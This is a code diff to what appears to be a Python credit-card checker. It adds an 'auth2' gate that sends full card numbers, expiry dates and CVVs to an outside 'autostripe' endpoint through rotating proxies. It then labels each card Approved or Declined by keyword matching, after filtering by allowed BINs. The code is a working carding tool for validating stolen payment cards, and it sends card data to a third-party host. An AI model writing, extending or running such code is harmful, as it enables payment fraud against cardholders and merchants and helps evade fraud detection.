@@ -419,7 +419,48 @@ def format_proxy(proxy_str):
     return None
 
 
-def process_single_entry(entry, proxies_list, user_id):
+def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
+    """Auth2 gate — uses stripe.stormx.pw autostripe endpoint."""
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}"
+
+    try:
+        resp = requests.get(url, timeout=35, proxies=proxies)
+        process_time = round(time.time() - start_time, 2)
+
+        if resp.status_code == 200:
+            resp_lower = resp.text.strip().lower()
+
+            approved_kw = [
+                'approved', 'success', 'charged', 'payment added', 'live', 'valid',
+                'succeeded', 'transaction approved', 'payment successful',
+                'authorization approved', 'ok', 'charge'
+            ]
+            declined_kw = [
+                'declined', 'failed', 'invalid', 'error', 'dead', 'decline',
+                'refused', 'blocked', 'insufficient', 'expired', 'incorrect'
+            ]
+
+            for kw in approved_kw:
+                if kw in resp_lower:
+                    return f"Approved | {resp.text.strip()} ({process_time}s)"
+
+            for kw in declined_kw:
+                if kw in resp_lower:
+                    return f"Declined | {resp.text.strip()} ({process_time}s)"
+
+            if len(resp.text.strip()) > 20:
+                return f"Approved | {resp.text.strip()} ({process_time}s)"
+            else:
+                return f"Declined | {resp.text.strip()} ({process_time}s)"
+        else:
+            return f"Declined | HTTP {resp.status_code} ({process_time}s)"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def process_single_entry(entry, proxies_list, user_id, gate="auth"):
     raw_proxy = random.choice(proxies_list) if proxies_list else None
     proxy_dict = format_proxy(raw_proxy)
 
@@ -435,7 +476,10 @@ def process_single_entry(entry, proxies_list, user_id):
                 if not any(c_num.startswith(b) for b in user_bin_list):
                     return "SKIPPED | BIN not allowed"
 
-            result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
+            if gate == "auth2":
+                result = check_cc_auth2(c_num, c_mm, c_yy, c_cvv, proxy_dict)
+            else:
+                result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
         else:
             result = "Error: Invalid Format"
 
